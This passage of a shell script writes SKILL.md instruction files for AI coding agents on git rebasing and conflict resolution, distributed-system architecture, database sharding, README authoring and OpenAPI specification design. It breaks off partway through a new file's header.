- Avoid rebase merges if individual commits on the branch are broken or do not compile.

## Workflow
1. Fetch latest changes: `git fetch origin`.
2. Rebase local branch onto target: `git rebase origin/main`.
3. Verify test suite passes on the rebased state.
4. Execute fast-forward or squash merge into target branch.
5. Delete merged local and remote feature branches.

## Expected Output
Clean Git merge commands and configuration directives delivering a linear, bisectable Git commit log.

## Validation Checklist
- [ ] Is `pull.rebase true` configured to prevent accidental merge bubbles?
- [ ] Does `main` maintain a linear, easily readable commit log?
- [ ] Does every commit on `main` represent a working, testable state?
- [ ] Are messy WIP commits squashed before integrating into trunk?
- [ ] Can `git bisect` navigate history without encountering non-compiling commits?

## Common Mistakes & Antipatterns
- Running `git pull` without `--rebase`, creating hundreds of empty 'Merge branch main into ...' commits that clutter the commit graph.
- Merging a feature branch with 30 broken intermediate commits into `main`, making it impossible to use `git bisect` to locate when a regression was introduced.
- Force-pushing to a shared public branch that other developers are actively basing work upon.

## Concrete Real-World Example
Scenario: A developer's feature branch has 14 commits with messages like 'wip', 'fixed typo', 'test again', and two merge commits pulling `main`.
Prompt: Clean up this feature branch and integrate it into `main` with a clean linear history.
Application: The AI rebases the branch onto `origin/main` to drop the merge commits, squashes the 14 commits into a single atomic Conventional Commit `feat(search): implement fuzzy filtering on product list`, and fast-forward merges it into `main`.
EOF

cat << 'EOF' > skills/git/rebasing/interactive-history-cleanup/SKILL.md
---
name: "interactive-history-cleanup"
description: "Mastering Git interactive rebase (git rebase -i), fixup and autosquash workflows, squashing commits, editing commit messages, and safely rewriting local branch history."
category: "git"
subcategory: "rebasing"
language: "bash"
framework: "none"
technology: "git"
difficulty: "advanced"
tags: ["git", "rebase", "interactive-rebase", "autosquash", "history-rewriting", "fixup"]
---

# Git Interactive Rebasing, History Rewriting, and Autosquash

## Purpose
Instruct AI agents to use interactive rebase to clean up messy local development histories, reorder commits, squash related changes, and prepare pristine commits for code review.

## When to Use
Use before opening a pull request, splitting a monolithic commit into logical units, reordering commits, or amending historical commit messages on private branches.

## Inputs / Context
Current branch, base branch or commit hash (`HEAD~N`, `main`), and desired commit reorganization.

## Instructions
1. Execute Interactive Rebase:
   - Launch interactive rebase: `git rebase -i origin/main` or `git rebase -i HEAD~N`.
   - Command directives:
     * `pick` (p): Keep commit as-is.
     * `reword` (r): Keep commit content, but edit commit message.
     * `edit` (e): Stop at this commit to amend files or split into multiple commits.
     * `squash` (s): Melt commit into previous commit, concatenating commit messages.
     * `fixup` (f): Melt commit into previous commit, completely discarding this commit's message.
     * `drop` (d): Completely delete the commit.
2. The Fixup and Autosquash Workflow:
   - While working on review feedback, create targeted fixup commits: `git commit --fixup <commit-hash>`.
   - Rebase with automatic squashing: `git rebase -i --autosquash origin/main`. Git automatically pairs and squashes each fixup commit into its corresponding parent commit without manual intervention.
3. Split a Commit into Multiple Commits:
   - Mark commit with `edit` in rebase todo list.
   - Reset changes while keeping files staged: `git reset HEAD~1`.
   - Selectively stage and commit atomic changes using `git add -p` and `git commit`.
   - Resume rebase: `git rebase --continue`.
4. Recover from Mistakes using `git reflog`:
   - If an interactive rebase goes wrong, never panic: every previous HEAD state is recorded in `git reflog`.
   - Restore exact pre-rebase state: `git reset --hard ORIG_HEAD` or `git reset --hard HEAD@{n}`.
5. Push Safely using `--force-with-lease`:
   - Never use blind `git push -f`; always use `git push --force-with-lease` to ensure you do not overwrite commits pushed by collaborators.

## Constraints / Rules
- Never rewrite history (rebase) on public, shared branches like `main`.
- Never use raw `git push --force`; always use `git push --force-with-lease`.
- Do not rebase without ensuring local uncommitted changes are stashed or committed first.

## Workflow
1. Ensure working tree is clean (`git status`).
2. Mark commits for fixup using `git commit --fixup <hash>`.
3. Run `git rebase -i --autosquash origin/main`.
4. Review and save the rebase instruction list.
5. Verify tests pass on cleaned history.
6. Push with `git push --force-with-lease`.

## Expected Output
Clean, logical sequence of atomic Git commits ready for peer review, with descriptive Conventional Commit messages.

## Validation Checklist
- [ ] Are fixup commits folded into parents using `--autosquash`?
- [ ] Are all commit messages descriptive and clear?
- [ ] Are pushes executed using `--force-with-lease`?
- [ ] Is public shared branch history preserved untouched?
- [ ] Does `git log --oneline` show a clean, logical progression?

## Common Mistakes & Antipatterns
- Rebasing commits that have already been pushed to `main` and pulled by other team members, causing widespread Git history corruption.
- Using `git push --force`, accidentally wiping out a colleague's commits that were pushed while you were rebasing.
- Panicking during a rebase conflict and deleting files manually instead of using `git rebase --abort`.

## Concrete Real-World Example
Scenario: A developer has 6 commits on their feature branch: 3 implement the feature, 2 fix typos, and 1 adjusts a test. They want to submit 2 clean, atomic commits for review.
Prompt: Guide an interactive rebase to squash typo and test fixes into the main feature commits.
Application: The AI configures `git rebase -i HEAD~6`, changes the action of the typo and test commits from `pick` to `fixup`, groups them under the primary feature commits, saves the plan, verifies tests pass, and pushes with `--force-with-lease`.
EOF

cat << 'EOF' > skills/git/conflict-resolution/three-way-merge-conflict-resolution/SKILL.md
---
name: "three-way-merge-conflict-resolution"
description: "Systematic resolution of Git merge and rebase conflicts utilizing the three-way merge model (diff3 / zdiff3), base ancestor inspection, and conflict markers."
category: "git"
subcategory: "conflict-resolution"
language: "bash"
framework: "none"
technology: "git-conflicts"
difficulty: "intermediate"
tags: ["git", "merge-conflicts", "diff3", "zdiff3", "three-way-merge", "resolution"]
---

# Git Three-Way Merge Conflict Resolution and Diff3 Mechanics

## Purpose
Provide AI agents with a deterministic methodology for dissecting and resolving complex Git merge conflicts by understanding the common ancestor and both competing change branches.

## When to Use
Use when encountering merge or rebase conflicts, cherry-pick collisions, or resolving cross-branch code divergences.

## Inputs / Context
Conflicted files, conflict markers (`<<<<<<<`, `=======`, `>>>>>>>`), base commit, current branch, and incoming branch.

## Instructions
1. Enable Enhanced Three-Way Conflict Display (`zdiff3`):
   - By default, Git shows only two versions: YOURS (`HEAD`) and THEIRS (`branch`). It hides the common ancestor, making it impossible to know what originally changed.
   - Configure modern `zdiff3` conflict style globally:
     `git config --global merge.conflictStyle zdiff3`
   - `zdiff3` displays three sections:
     * `<<<<<<< HEAD`: Your current local changes.
     * `||||||| base`: The common ancestor code before either branch touched it.
     * `=======`: Separator.
     * `>>>>>>> incoming`: The competing changes from the incoming branch.
2. The 4-Step Resolution Algorithm:
   - Step 1 (Inspect Base): Look at the `||||||| base` section to see what the code looked like originally.
   - Step 2 (Inspect Ours): Look at `<<<<<<< HEAD` to understand what intent YOUR branch introduced relative to base.
   - Step 3 (Inspect Theirs): Look at `>>>>>>> incoming` to understand what intent THEIR branch introduced relative to base.
   - Step 4 (Synthesize): Merge the intentionality of BOTH changes into a unified, non-conflicting implementation.
3. Clean Up Conflict Markers Completely:
   - Ensure every `<<<<<<<`, `|||||||`, `=======`, and `>>>>>>>` marker is removed from all files before staging.
4. Verify Compilation and Test Suite:
   - Never mark a conflict resolved (`git add`) without compiling the code and running the unit test suite; syntactic conflicts may be resolved while semantic logic is broken.
5. Conclude the Conflict Resolution:
   - For rebase: `git add <resolved-files> && git rebase --continue`.
   - For merge: `git add <resolved-files> && git commit`.

## Constraints / Rules
- Never blindly choose `--ours` or `--theirs` across entire files without inspecting line-by-line intent.
- Never leave dangling Git conflict markers in source code.
- Do not run `git rebase --skip` unless you intentionally wish to discard all commits from your branch.

## Workflow
1. Identify conflicted files using `git status`.
2. Inspect each file under `zdiff3` style comparing Base, Ours, and Theirs.
3. Synthesize the unified code preserving both functional intents.
4. Run compiler and unit test suite to verify correctness.
5. Stage resolved files: `git add <files>`.
6. Resume operation: `git rebase --continue` or `git commit`.

## Expected Output
Properly resolved source code files with zero conflict markers, verified passing test suite, and completed rebase/merge.

## Validation Checklist
- [ ] Is `merge.conflictStyle zdiff3` utilized for ancestor inspection?
- [ ] Are all conflict marker strings completely deleted?
- [ ] Does the synthesized code preserve the valid intent of both branches?
- [ ] Does the test suite pass with zero syntax or assertion errors?
- [ ] Is the rebase/merge operation cleanly concluded?

## Common Mistakes & Antipatterns
- Blindly running `git checkout --ours .`, silently throwing away 3 days of a colleague's work.
- Accidentally leaving `<<<<<<< HEAD` in a file, which slips past code review and crashes the production build.
- Resolving syntax conflicts so the file parses, but introducing a logic bug because two variables were renamed differently in the two branches.

## Concrete Real-World Example
Scenario: A rebase conflict occurs on `package.json` where branch A added `zod` and branch B added `pydantic`, resulting in conflict markers.
Prompt: Resolve this merge conflict using three-way merge analysis.
Application: The AI inspects the base, sees neither dependency was present originally, recognizes that both dependencies are required by their respective new modules, keeps both dependencies in the merged JSON, removes conflict markers, runs `npm install`, and continues the rebase cleanly.
EOF

cat << 'EOF' > skills/architecture/system-design/high-availability-and-partitioning/SKILL.md
---
name: "high-availability-and-partitioning"
description: "Designing high-availability distributed systems utilizing the CAP theorem, horizontal partitioning (sharding), consistent hashing, and redundancy."
category: "architecture"
subcategory: "system-design"
language: "agnostic"
framework: "none"
technology: "system-design"
difficulty: "advanced"
tags: ["architecture", "system-design", "high-availability", "sharding", "consistent-hashing", "cap-theorem"]
---

# High Availability System Design and Partitioning Architecture

## Purpose
Instruct AI agents to author comprehensive system design architectures that eliminate single points of failure, partition data horizontally, and maintain high availability (99.99%+).

## When to Use
Use when architecting large-scale backend systems, preparing system design proposals, designing high-throughput data platforms, or scaling beyond single-node databases.

## Inputs / Context
Traffic scale (QPS/RPS), data storage growth per year, latency budget, availability target (number of 9s), and consistency model requirements.

## Instructions
1. Eliminate All Single Points of Failure (SPOF):
   - Every tier of the architecture (DNS, Load Balancers, API Gateways, Application Servers, Caches, Databases) must be deployed across at least two Availability Zones (AZs) with automated failover.
2. Evaluate CAP / PACELC Theorem Trade-offs:
   - Under network partitions (P): Choose Consistency (CP) for financial ledgers, inventory counters, and auth tokens; choose Availability (AP) for social media feeds, analytics telemetry, and shopping cart browsing.
3. Horizontal Data Partitioning (Sharding):
   - Select a high-cardinality Partition Key that evenly distributes write and read traffic (e.g., `user_id` or `tenant_id`).
   - Avoid low-cardinality keys (like `country` or `gender`) that create hot partition bottlenecks.
4. Consistent Hashing for Distributed Nodes:
   - Use Consistent Hashing with virtual nodes (tokens) across distributed caches and database shards.
   - When a node is added or removed, consistent hashing rebalances only `K/N` keys (where K is total keys, N is node count), preventing massive cache churn.
5. Asynchronous Decoupling via Message Queues:
   - Convert synchronous HTTP request-response chains between microservices into asynchronous message-driven queues (Kafka, SQS) to isolate failures and absorb traffic spikes.
6. Graceful Degradation and Shedding:
   - Implement load shedding (rejecting low-priority background requests when CPU > 85%) to protect critical user login and checkout transactions.

## Constraints / Rules
- Never design a high-availability system with a single master database without automated standby replication and failover.
- Avoid cross-shard joins and distributed transactions (2PC) across database shards; design queries to be satisfied within a single shard.
- Do not choose a partition key that concentrates traffic onto a single hot node.

## Workflow
1. Estimate capacity: calculate QPS, read/write ratio, and 5-year storage volume.
2. Define high-level architecture diagrams (Load Balancers, Services, Caches, Shards).
3. Select partition key and consistent hashing scheme.
4. Formulate failure modes for each tier and establish redundancy.
5. Document latency budgets and CAP theorem trade-offs.

## Expected Output
System Design specification document featuring capacity calculations, data flow architecture, sharding strategy, and failure recovery protocols.

## Validation Checklist
- [ ] Are single points of failure eliminated across all tiers?
- [ ] Is the partition key evaluated for hot-spot distribution risks?
- [ ] Is consistent hashing utilized for cache/shard routing?
- [ ] Are CAP theorem consistency/availability trade-offs explicitly justified?
- [ ] Is load shedding and circuit breaking designed for peak traffic surges?

## Common Mistakes & Antipatterns
- Sharding a database by `created_date`, causing 100% of all current write traffic to hit the single shard representing 'today', leaving historical shards completely idle.
- Relying on cross-datacenter two-phase commit (2PC) transactions, causing network latency to choke entire system throughput.
- Designing a redundant 4-node API cluster that all connects to a single un-replicated MySQL database running on a single VM.

## Concrete Real-World Example
Scenario: A video sharing platform expects 100,000 video uploads per day and 100 million video views per day, exceeding the capacity of any single database node.
Prompt: Design a high-availability, horizontally partitioned system architecture for this video platform.
Application: The AI calculates throughput (1,200 read QPS baseline, 5,000 peak), shards user and video metadata using consistent hashing on `video_id`, places a Redis cluster in front of metadata shards, offloads video streaming to CloudFront CDN, and routes uploads through an asynchronous S3/SQS worker pipeline.
EOF

cat << 'EOF' > skills/architecture/clean-architecture/onion-and-hexagonal-domain-isolation/SKILL.md
---
name: "onion-and-hexagonal-domain-isolation"
description: "Structuring maintainable enterprise applications using Clean / Onion Architecture, strict Dependency Inversion, Entity Enterprise Business Rules, and Use Case Interactors."
category: "architecture"
subcategory: "clean-architecture"
language: "agnostic"
framework: "none"
technology: "clean-architecture"
difficulty: "advanced"
tags: ["architecture", "clean-architecture", "onion-architecture", "domain-driven-design", "dependency-inversion"]
---

# Clean Architecture, Onion Architecture, and Domain Isolation

## Purpose
Instruct AI agents to author enterprise software structured in concentric Clean Architecture layers, ensuring domain rules remain completely decoupled from databases, UI, and external frameworks.

## When to Use
Use when designing enterprise core systems, long-lived applications, multi-channel software (serving Web, Mobile, CLI simultaneously), or domain-heavy business software.

## Inputs / Context
Business domain model, use cases, persistence needs, and delivery channels (HTTP, CLI, gRPC).

## Instructions
1. Enforce the Dependency Rule (Concentric Circles):
   - Source code dependencies must ONLY point inward toward higher-level policies.
   - Nothing in an inner circle can know anything at all about something in an outer circle (e.g., Domain Entities know nothing of Use Cases; Use Cases know nothing of Controllers or Databases).
2. The Four Concentric Layers:
   - Core / Entities: Enterprise business rules, domain invariants, value objects. Zero framework dependencies.
   - Use Cases (Application): Application-specific business rules, interactor workflows, orchestration. Declares Inbound and Outbound Port interfaces.
   - Interface Adapters: Converts data from use case format to external delivery format (Controllers, Presenters, Gateways, Repository Implementations).
   - Frameworks & Drivers (Infrastructure): Web frameworks (Express, Spring, FastAPI), database drivers (Postgres, Mongo), UI, third-party SDKs.
3. Crossing Boundaries with Polymorphism (Dependency Inversion):
   - When a Use Case needs to persist an entity, it does NOT import a database repository directly.
   - The Use Case declares an Interface (Outbound Port) in the inner layer: `interface UserRepository { save(user: User): Promise<void>; }`.
   - The outer Infrastructure layer implements this interface: `class PostgresUserRepository implements UserRepository`.
4. Decouple Data Transfer Objects (DTOs):
   - Never pass raw database models or HTTP request objects across layer boundaries; use plain DTOs or Value Objects.
5. Independent Testability:
   - The entire business logic (Entities and Use Cases) must be testable without starting a web server, database, or external network connection.

## Constraints / Rules
- Never import an outer-layer class or library into an inner-layer file.
- Never place SQL queries, ORM annotations, or HTTP status codes inside the Domain or Use Case layers.
- Avoid passing domain entities directly to the UI presentation layer; map through Presenter DTOs.

## Workflow
1. Define core domain Entities and value objects.
2. Formulate Use Case Interactors declaring Port interfaces.
3. Implement Controllers and Repository Adapters in Interface Adapter layer.
4. Configure framework routers and database connection drivers in Infrastructure.
5. Wire dependencies together in Composition Root.

## Expected Output
Clean Architecture package layout and code implementation demonstrating strict inward dependency flow, Port interfaces, and framework isolation.

## Validation Checklist
- [ ] Do all dependencies point strictly inward?
- [ ] Is the Domain layer 100% free of database and framework imports?
- [ ] Are external integrations defined as Port interfaces in the Application layer?
- [ ] Can all Use Cases be unit tested purely in memory with mock ports?
- [ ] Are DTOs used to pass data across architectural boundaries?

## Common Mistakes & Antipatterns
- Importing an ORM entity class (like TypeORM or Prisma) into the innermost Domain entity layer.
- Passing the Express `Request` and `Response` objects directly into a Use Case interactor.
- Calling a payment gateway API directly from inside a domain entity calculation.

## Concrete Real-World Example
Scenario: An enterprise payroll system needs to support both an Express web API and a batch CLI tool while allowing the database to migrate from MySQL to PostgreSQL.
Prompt: Structure this payroll system using Clean Architecture.
Application: The AI creates an inner `Domain` module with `Employee` and `PayrollCalculation`, an `Application` module with `CalculatePayrollUseCase` and `PayrollRepository` port, an `Infrastructure` module implementing `PostgresPayrollRepository`, and two lightweight driving adapters (`ExpressController` and `CliCommand`).
EOF

cat << 'EOF' > skills/architecture/microservices/event-driven-eventual-consistency/SKILL.md
---
name: "event-driven-eventual-consistency"
description: "Architecting resilient microservices utilizing Event-Driven Architecture, the Transactional Outbox Pattern, Saga orchestration/choreography, and eventual consistency."
category: "architecture"
subcategory: "microservices"
language: "agnostic"
framework: "none"
technology: "microservices-event-driven"
difficulty: "advanced"
tags: ["architecture", "microservices", "event-driven", "saga-pattern", "transactional-outbox", "eventual-consistency"]
---

# Microservices Event-Driven Architecture and Eventual Consistency (Saga Pattern)

## Purpose
Instruct AI agents to author distributed microservice workflows that maintain data consistency across distributed database boundaries without blocking two-phase commits.

## When to Use
Use when designing distributed transactions across microservices (e.g., checkout spanning Order, Payment, Inventory, and Shipping services).

## Inputs / Context
Service boundaries, database per service, distributed transaction steps, failure compensation actions, and messaging broker.

## Instructions
1. Database-per-Service Principle:
   - Each microservice must own and encapsulate its own private database.
   - Microservices must NEVER access or query another service's database directly; all data exchange must occur via APIs or asynchronous event streams.
2. The Transactional Outbox Pattern:
   - When a service updates its database AND emits an event, doing both in separate steps creates a fatal dual-write inconsistency if the process crashes between the DB write and the message publish.
   - Solution: In the exact same database transaction as the business mutation, insert an event record into a local `outbox` table.
   - A dedicated Outbox Relay worker (or Change Data Capture / Debezium) tails the outbox table and reliably publishes events to the message broker (Kafka/RabbitMQ) with at-least-once delivery guarantees.
3. Distributed Transactions with the Saga Pattern:
   - Replace blocking two-phase commit (2PC) with the Saga Pattern: a sequence of local transactions where each step publishes an event triggering the next step.
   - Choreography: Services react to events autonomously without a central coordinator (best for simple 2-3 step workflows).
   - Orchestration: A dedicated Saga Orchestrator service commands participants what local transactions to execute and monitors progress (best for complex workflows).
4. Compensating Transactions (Rollback Mechanism):
   - If a step fails in a Saga (e.g., Payment declined at step 3), the Saga must execute explicit Compensating Transactions backwards to undo previous steps (e.g., release reserved inventory, cancel pending order).
5. Idempotent Event Consumers:
   - In distributed messaging, networks guarantee at-least-once delivery, meaning duplicate events WILL occur.
   - Every consumer must be idempotent: store processed message IDs to discard duplicates.

## Constraints / Rules
- Never share a single database across multiple independent microservices.
- Never write dual-writes (DB insert followed by message publish) without the Transactional Outbox pattern.
- Avoid building Sagas without defining explicit compensating transactions for every step.

## Workflow
1. Define service boundaries and private database schemas.
2. Implement local database transaction writing to business tables and `outbox` table.
3. Configure Outbox Relay to publish to message broker.
4. Author Saga Orchestrator managing forward steps and compensating rollback steps.
5. Implement idempotent message consumer handlers.

## Expected Output
Event-driven microservice specification and code implementing the Transactional Outbox pattern, Saga orchestrator state machine, and compensating rollback handlers.

## Validation Checklist
- [ ] Does each microservice own its own isolated database?
- [ ] Is the Transactional Outbox pattern used to prevent dual-write bugs?
- [ ] Are compensating transactions defined for every reversible Saga step?
- [ ] Are all message consumer event handlers idempotent?
- [ ] Is eventual consistency verified under simulated intermediate service crashes?

## Common Mistakes & Antipatterns
- Executing `db.orders.insert()` followed by `kafka.publish('order_created')`: the server crashes after the insert, leaving the order in the database while no other service ever hears about it.
- Building microservices that share a single unified PostgreSQL database, creating a distributed monolith with tight schema coupling.
- Assuming distributed events will never arrive out of order or more than once.

## Concrete Real-World Example
Scenario: An e-commerce purchase requires reserving inventory in the Inventory Service, charging a card in the Payment Service, and creating an order in the Order Service.
Prompt: Design a fault-tolerant Saga orchestration workflow with compensating transactions for this checkout sequence.
Application: The AI creates an `OrderSagaOrchestrator` that executes local transactions, publishes outbox events, handles payment failures by issuing a compensating `ReleaseInventoryCommand`, and records transaction state in an idempotent saga log.
EOF

cat << 'EOF' > skills/architecture/scalability/horizontal-scaling-and-sharding/SKILL.md
---
name: "horizontal-scaling-and-sharding"
description: "Scaling databases and stateful backends from single nodes to distributed clusters using read-replicas, CQRS, horizontal database sharding, and write buffers."
category: "architecture"
subcategory: "scalability"
language: "agnostic"
framework: "none"
technology: "scaling-architecture"
difficulty: "advanced"
tags: ["architecture", "scalability", "sharding", "read-replicas", "cqrs", "horizontal-scaling"]
---

# Horizontal Scaling, Read Replicas, and Sharding Architectures

## Purpose
Provide AI agents with architectural strategies for scaling database read and write throughput when single-node relational instances reach hardware CPU, memory, and IOPS ceilings.

## When to Use
Use when scaling databases past single large instances, handling massive read/write imbalances, or architecting multi-terabyte data platforms.

## Inputs / Context
Read vs write QPS ratios, dataset size, query latency percentiles, and hardware constraints.

## Instructions
1. Vertical vs. Horizontal Scaling Roadmap:
   - Stage 1: Vertical Scaling (Bigger Instance) + Index Tuning & Connection Pooling.
   - Stage 2: Caching (Redis/Memcached) for hot read paths.
   - Stage 3: Read Replicas (Read/Write Splitting) with asynchronous replication for read-heavy workloads (e.g., 90% reads, 10% writes).
   - Stage 4: CQRS (Command Query Responsibility Segregation): Separate specialized read databases (Elasticsearch/ClickHouse for search and analytics) from OLTP write masters.
   - Stage 5: Horizontal Sharding: Splitting data across multiple write-master databases.
2. Read/Write Splitting Architecture:
   - Configure application connection routers: send `SELECT` queries to Read Replica pools; send `INSERT`, `UPDATE`, `DELETE` to the Primary Master.
   - Mitigate Replication Lag: When a user performs a write (e.g., posts a comment), route subsequent reads from that specific user to the Primary Master for 5 seconds ('Read-Your-Own-Writes' consistency), while routing general users to replicas.
3. Horizontal Sharding Patterns:
   - Range-Based Sharding: Partition by range (e.g., IDs 1-10M on Shard 1). Risk: severe write hot-spotting on the latest range.
   - Hash-Based Sharding: Partition by `hash(sharding_key) % num_shards`. Provides uniform write distribution.
   - Directory / Lookup Sharding: A central mapping service maps entity IDs to specific physical shard nodes. Highly flexible for shard migrations.
4. Sharding Router / Proxy Layer:
   - Abstract sharding topology behind a routing proxy (Vitess, Citus, or application-level routing) so developers write standard queries without managing raw shard connections.

## Constraints / Rules
- Never jump directly to horizontal database sharding before exhausting caching, indexing, and read-replica optimizations.
- Avoid sharding keys that cause cross-shard queries on primary OLTP workflows.
- Do not ignore replication lag in read-replica configurations.

## Workflow
1. Audit database metrics to determine whether the bottleneck is Read-bound or Write-bound.
2. If Read-bound, deploy Read Replicas with Read-Your-Own-Writes routing.
3. If Write-bound, select an optimal sharding key and hashing strategy.
4. Implement sharding router middleware.
5. Establish automated shard rebalancing procedures.

## Expected Output
Comprehensive database scaling architecture blueprint featuring read/write splitting, replication lag mitigation, and horizontal sharding routing diagrams.

## Validation Checklist
- [ ] Is Read/Write splitting implemented with a routing proxy?
- [ ] Is 'Read-Your-Own-Writes' consistency enforced for mutating users?
- [ ] Is the sharding key evaluated for uniform hash distribution?
- [ ] Are cross-shard joins strictly avoided in high-frequency queries?
- [ ] Are shard rebalancing and migration plans documented?

## Common Mistakes & Antipatterns
- Sharding prematurely when simple query indexing and a 20-dollar Redis cache would have solved the performance bottleneck with 1% of the complexity.
- Reading from a read replica immediately after a user updates their profile, showing the user their old profile because of 200ms replication lag, confusing the user into resubmitting.
- Selecting a sharding key like `country`, causing the US shard to melt while other country shards remain 95% empty.

## Concrete Real-World Example
Scenario: A SaaS project management platform is running out of database write IOPS on an AWS RDS Postgres primary database holding 40 million tasks across 5,000 corporate tenants.
Prompt: Design a horizontal database sharding strategy for this multi-tenant SaaS platform.
Application: The AI selects `tenant_id` as the sharding key, hashes tenant IDs across a cluster of 4 PostgreSQL shards, routes tenant queries via application middleware, guarantees all tenant task queries stay confined to a single shard, and provides unlimited horizontal write scaling.
EOF

cat << 'EOF' > skills/documentation/readme/developer-first-readme-architecture/SKILL.md
---
name: "developer-first-readme-architecture"
description: "Authoring exceptional, developer-first README.md files with immediate value propositions, copy-paste quickstarts, architectural diagrams, and troubleshooting FAQs."
category: "documentation"
subcategory: "readme"
language: "markdown"
framework: "none"
technology: "documentation"
difficulty: "beginner"
tags: ["documentation", "readme", "open-source", "technical-writing", "developer-experience"]
---

# Developer-First README Architecture and Project Scaffolding

## Purpose
Instruct AI agents to author clear, compelling, and actionable README.md files that guide developers from initial discovery to a running local environment in under 5 minutes.

## When to Use
Use when creating new software repositories, open-source projects, internal company libraries, or revamping confusing legacy documentation.

## Inputs / Context
Project name, purpose, architecture, prerequisites, installation steps, core usage examples, and configuration options.

## Instructions
1. Structure the README into Canonical Developer-First Sections:
   - Header: Clear Project Title, one-sentence value proposition tagline, and status badges (CI build, license, version).
   - Problem & Solution: Why does this project exist? What specific pain does it solve?
   - Architecture / Features: Bulleted summary of key capabilities or an architectural ASCII/Mermaid diagram.
   - Quickstart (Copy-Paste Ready): Prerequisites, clone command, dependency installation, and running local development commands (`npm install && npm run dev`).
   - Configuration / Environment Variables: Table documenting every required and optional environment variable with examples and defaults.
   - Core Usage Examples: Realistic, syntax-highlighted code snippets demonstrating the most common 2-3 developer workflows.
   - Project Structure: Clean ASCII file tree explaining the primary directory organization.
   - Contributing & License: Links to `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, and license type.
2. Eliminate Marketing Fluff:
   - Avoid vague buzzwords ('revolutionary', 'game-changing', 'blazing-fast').
   - Provide concrete technical facts: 'Zero dependencies', 'Under 5KB gzipped', 'Sub-millisecond query time'.
3. Guarantee Copy-Paste Accuracy:
   - Every terminal command and code block must be syntactically valid and runnable without unstated prerequisite assumptions.
4. Keep Above the Fold Concise:
   - A developer scanning the top of the README should understand what the project does and how to install it in under 30 seconds.

## Constraints / Rules
- Never write README files without an immediate Quickstart section.
- Never document environment variables without specifying whether they are required or optional.
- Avoid multi-page walls of uninterrupted text without headings, tables, or code fences.

## Workflow
1. Define core value proposition tagline.
2. Write concise 3-step Quickstart guide.
3. Document environment variables in a markdown table.
4. Author realistic usage code examples.
5. Add project tree and contribution links.
6. Verify all commands execute cleanly in a blank VM.

## Expected Output
Polished, developer-first README.md with clear visual hierarchy, copy-paste installation commands, environment tables, and verified usage examples.

## Validation Checklist
- [ ] Is there an unambiguous one-sentence value proposition at the top?
- [ ] Can a developer get the project running locally in <= 3 copy-pasted commands?
- [ ] Are all environment variables documented in a table with defaults?
- [ ] Are code examples realistic and syntax-highlighted?
- [ ] Are links to CONTRIBUTING and LICENSE provided?

## Common Mistakes & Antipatterns
- Writing 10 paragraphs of philosophical background before showing a single line of code or installation command.
- Telling the user to 'configure your environment' without listing which environment variables are required.
- Providing obsolete installation commands that fail on modern Node or Python versions.

## Concrete Real-World Example
Scenario: An open-source TypeScript SDK has an outdated README filled with marketing paragraphs, leaving developers confused about how to initialize the client.
Prompt: Rewrite this SDK README to be developer-first with a 2-minute quickstart.
Application: The AI creates a crisp README starting with a one-sentence tagline, a 3-step quickstart code block, an options table, a full usage example with error handling, and an environment variable reference table.
EOF

cat << 'EOF' > skills/documentation/api-docs/openapi-specification-design/SKILL.md
---
name: "openapi-specification-design"
description: "Designing comprehensive OpenAPI 3.1 (Swagger) specifications with strict JSON Schema schemas, reusable components, error responses, and mock servers."
category: "documentation"
subcategory: "api-docs"
language: "yaml"
framework: "openapi"
technology: "openapi-3.1"
difficulty: "intermediate"
tags: ["documentation", "api-docs", "openapi", "swagger", "rest-api", "json-schema"]
---

# OpenAPI 3.1 Specification Design and Interactive Documentation

## Purpose
Instruct AI agents to author complete, accurate OpenAPI 3.1 specification files that enable interactive API documentation, automated SDK generation, and mock servers.

## When to Use
Use when designing REST API contracts, documenting microservice endpoints, configuring Swagger UI / Redoc, or generating client SDKs via OpenAPI Generator.

## Inputs / Context
API endpoints, HTTP methods, path/query parameters, request/response JSON schemas, authentication schemes, and status codes.

## Instructions
1. Standardize on OpenAPI 3.1.0:
   - Use `openapi: 3.1.0` for full JSON Schema alignment (allowing standard `type: ["string", "null"]`, `$defs`, and pattern properties).
2. Modularize using Reusable `components`:
   - Never duplicate schema structures inline across multiple paths.
   - Define reusable schemas under `components/schemas/` (e.g., `User`, `ErrorResponse`, `PaginationMeta`).
   - Define reusable security schemes under `components/securitySchemes/` (Bearer JWT, APIKey, OAuth2).
   - Define reusable HTTP responses under `components/responses/` (e.g., `NotFound`, `Unauthorized`).
3. Document All Possible HTTP Status Codes:
   - Every path must document not only 200/201 Success, but also expected client and server error codes:
     * `400 Bad Request` (Validation errors).
     * `401 Unauthorized` (Missing or invalid auth token).
     * `403 Forbidden` (Insufficient permissions).
     * `404 Not Found` (Resource missing).
     * `429 Too Many Requests` (Rate limit exceeded).
4. Provide Realistic Examples:
   - Always include realistic `example` or `examples` blocks for request bodies and response payloads; avoid useless generic placeholders like `"string"` or `0`.
5. Strict Parameter Typing and Descriptions:
   - Include clear `description` strings on every parameter explaining format, constraints, and valid ranges.

## Constraints / Rules
- Never write an OpenAPI specification without documenting error responses (4xx, 5xx).
- Avoid inline duplicate schema declarations; use `$ref: '#/components/schemas/...'`.
- Do not omit authentication requirements on protected endpoints.

## Workflow
1. Declare OpenAPI header with title, version, and server URLs.
2. Define security schemes under components.
3. Author reusable data models under `components/schemas`.
4. Define path operations with parameter bindings and `$ref` responses.
5. Validate specification using `spectral lint openapi.yaml`.

## Expected Output
Complete, valid OpenAPI 3.1 YAML specification file with modular components, realistic examples, and comprehensive status code schemas.

## Validation Checklist
- [ ] Is OpenAPI version set to 3.1.0?
- [ ] Are data models centralized in `components/schemas` with `$ref`?
- [ ] Are all standard error status codes (400, 401, 403, 404) documented?
- [ ] Do request and response schemas include realistic examples?
- [ ] Does Spectral linter validate the specification with zero errors?

## Common Mistakes & Antipatterns
- Documenting only the 200 OK response, leaving API consumers to guess what error format is returned on validation failures.
- Providing schemas where every example string is `"string"`, making interactive Swagger UI documentation useless for developer testing.
- Forgetting to link the security scheme to endpoints (`security: - BearerAuth: []`).

## Concrete Real-World Example
Scenario: A payment gateway REST API has no machine-readable documentation, making it difficult for mobile developers to integrate and generate client SDKs.
Prompt: Author an OpenAPI 3.1 specification for a payment charge and refund endpoint.
Application: The AI creates a modular `openapi.yaml` file defining `ChargeRequest` and `ChargeResponse` under components, documents idempotency headers, includes realistic card and amount examples, defines error responses conforming to RFC 7807, and binds Bearer token authentication.
EOF

cat << 'EOF' > skills/documentation/code-comments/intent-clarification-and-invariants/SKILL.md
---
name: "intent-clarification-and-invariants"
description: "Authoring high-value code comments that document architectural intent, non-obvious business invariants, hardware quirks, and algorithmic complexity rather than restating code."
